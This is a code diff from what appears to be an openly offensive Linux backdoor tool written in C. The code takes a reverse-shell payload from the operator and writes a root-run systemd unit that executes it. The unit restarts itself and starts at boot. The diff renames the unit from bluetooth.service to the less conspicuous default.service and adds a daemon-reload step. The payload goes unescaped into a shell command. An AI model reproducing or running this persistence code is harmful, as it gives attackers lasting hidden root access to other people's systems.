@@ -94,34 +94,41 @@ wait(NULL);
 
 case 2:
 
+	ssize_t result;
+
 	char command[200];
 	char payload[200];
 
 	printf("YOUR PAYLOAD FOR REVERSE SHELL\n");
-	printf("[+] => ");
-	fgets(payload,200,stdin);
+	result = read(0, payload, sizeof(payload));
+	
+	 if (payload[result - 1] == '\n') {
+        payload[result - 1] = '\0';
+    }
 
-	system("echo '[backdoor]' > /etc/systemd/system/bluetooth.service");
-	system("echo 'Description=Backdoor_for_linux' >> /etc/systemd/system/bluetooth.service");
-	system("echo '' >> /etc/systemd/system/bluetooth.service");
-	system("echo '[Service]' >> /etc/systemd/system/bluetooth.service");
-	system("echo 'User=root' >> /etc/systemd/system/bluetooth.service");
-	system("echo 'Group=root' >> /etc/systemd/system/bluetooth.service");
-	system("echo 'WorkingDirectory=/root' >> /etc/systemd/system/bluetooth.service");
+	system("echo '[backdoor]' > /etc/systemd/system/default.service");
+	system("echo 'Description=Backdoor_for_linux' >> /etc/systemd/system/default.service");
+	system("echo '' >> /etc/systemd/system/default.service");
+	system("echo '[Service]' >> /etc/systemd/system/default.service");
+	system("echo 'User=root' >> /etc/systemd/system/default.service");
+	system("echo 'Group=root' >> /etc/systemd/system/default.service");
+	system("echo 'WorkingDirectory=/root' >> /etc/systemd/system/default.service");
 
 	// Payload	
 
-	sprintf(command, "echo 'ExecStart=%s' >> /etc/systemd/system/bluetooth.service ", payload);
+	sprintf(command, "echo 'ExecStart=%s' >> /etc/systemd/system/default.service ", payload);
 	system(command);
 
-	system("echo 'Restart=always' >> /etc/systemd/system/bluetooth.service");
-	system("echo 'RestartSec=5' >> /etc/systemd/system/bluetooth.service");
-	system("echo '' >> /etc/systemd/system/bluetooth.service");
-	system("echo '[Install]' >> /etc/systemd/system/bluetooth.service");
-	system("echo 'WantedBy=multi-user.target' >> /etc/systemd/system/bluetooth.service");
+	system("echo 'Restart=always' >> /etc/systemd/system/default.service");
+	system("echo 'RestartSec=5' >> /etc/systemd/system/default.service");
+	system("echo '' >> /etc/systemd/system/default.service");
+	system("echo '[Install]' >> /etc/systemd/system/default.service");
+	system("echo 'WantedBy=multi-user.target' >> /etc/systemd/system/default.service");
+
 
 	// INIT SERVICE BACKDOOR
-	system("/usr/bin/systemctl start bluetooth.service && /usr/bin/systemctl enable bluetooth.service");
+	system("/usr/bin/systemctl daemon-reload");
+	system("/usr/bin/systemctl start default.service && /usr/bin/systemctl enable default.service");
 
 
 	break;
